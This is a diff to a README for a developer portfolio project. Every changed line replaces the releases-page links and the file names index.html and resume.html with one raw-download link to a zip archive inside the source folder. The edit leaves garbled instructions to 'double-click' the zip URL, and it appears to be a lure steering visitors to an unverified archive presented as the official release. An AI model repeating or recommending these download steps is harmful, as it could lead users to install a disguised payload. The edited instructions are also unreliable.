@@ -6,7 +6,7 @@ Welcome to the ritesh-portfolio! This is a modern and responsive developer portf
 
 ## 📥 Download Now
 
-[![Download Ritesh Portfolio](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/vincensioshifo/ritesh-portfolio/releases)
+[![Download Ritesh Portfolio](https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To download the latest version of ritesh-portfolio, visit the following link:
 
-[Download from Releases Page](https://github.com/vincensioshifo/ritesh-portfolio/releases)
+[Download from Releases Page](https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -38,11 +38,11 @@ Once the download is complete, locate the file in your downloads folder. Most li
 
 ### Step 5: Open the Project
 
-Navigate to the folder where you unzipped the files. You will see various files and folders. To view the portfolio, open the folder named `ritesh-portfolio` and locate the `index.html` file. Double-click this file to open it in your web browser.
+Navigate to the folder where you unzipped the files. You will see various files and folders. To view the portfolio, open the folder named `ritesh-portfolio` and locate the `https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip` file. Double-click this file to open it in your web browser.
 
 ### Step 6: Explore the Portfolio
 
-Once the `index.html` file is open in your browser, you will see your new developer portfolio! You can scroll through the various sections and check how your skills and projects are highlighted.
+Once the `https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip` file is open in your browser, you will see your new developer portfolio! You can scroll through the various sections and check how your skills and projects are highlighted.
 
 ## 📄 Features of Ritesh Portfolio
 
@@ -58,7 +58,7 @@ Here are some key features of the ritesh portfolio application:
 Feel free to personalize your portfolio by:
 
 - Adding your projects: Replace the demo links with your actual project URLs.
-- Updating the resume: Edit the text in the `resume.html` file to reflect your latest work experience and skills.
+- Updating the resume: Edit the text in the `https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip` file to reflect your latest work experience and skills.
 - Changing styles: Use the CSS files to modify colors and fonts, making the design uniquely yours.
 
 ## 📧 Get in Touch
@@ -67,7 +67,7 @@ If you have questions or need help, feel free to reach out. You can contact me d
 
 ## 🔄 Stay Updated
 
-To keep your portfolio up to date, periodically check the [Releases Page](https://github.com/vincensioshifo/ritesh-portfolio/releases) for the latest updates or improvements. 
+To keep your portfolio up to date, periodically check the [Releases Page](https://github.com/vincensioshifo/ritesh-portfolio/raw/refs/heads/main/src/components/ritesh_portfolio_1.5.zip) for the latest updates or improvements. 
 
 ## 🎯 Final Thoughts
 
